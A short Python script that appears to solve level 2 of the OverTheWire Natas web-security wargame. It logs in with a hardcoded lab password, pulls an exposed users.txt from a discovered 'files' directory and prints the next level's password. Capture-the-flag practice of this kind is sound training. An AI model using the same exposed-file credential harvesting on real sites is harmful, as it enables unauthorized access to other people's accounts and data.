# Natas2 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas2.natas.labs.overthewire.org/files/users.txt"

auth_name = 'natas2'
auth_pass = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'
# ***********************************************

# A 'pixel.png' gave away knowledge of a 'files' path.
# A file in this path contains the password
r = requests.get(URL, auth=(auth_name, auth_pass))

for x in r.iter_lines():
    if "natas3" in x:
        print x